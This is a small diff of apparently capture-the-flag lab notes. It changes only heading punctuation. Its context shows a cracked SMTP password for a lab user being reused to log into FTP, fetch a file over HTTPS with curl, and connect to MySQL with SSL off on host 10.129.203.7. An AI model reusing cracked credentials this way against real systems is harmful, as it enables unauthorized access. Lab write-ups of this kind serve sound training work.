@@ -49,7 +49,7 @@ IP: 10.129.203.7
 
 	[25][smtp] host: 10.129.203.7   login: fiona@inlanefreight.htb   password: 987654321
 
-#### FTP auth worked with the same password — pulled notes:
+#### FTP auth worked with the same password - pulled notes:
 
 ```diff
 + $ ftp 10.129.203.7
@@ -68,7 +68,7 @@ IP: 10.129.203.7
 + $ curl -k -H "Host: localhost" --basic -u fiona:987654321 https://10.129.203.7/docs.txt
 ```
 
-#### Try MySQL with the same creds — no SSL:
+#### Try MySQL with the same creds - no SSL:
 
 ```diff
 + $ mysql -u fiona -p987654321 --ssl=0 -h 10.129.203.7
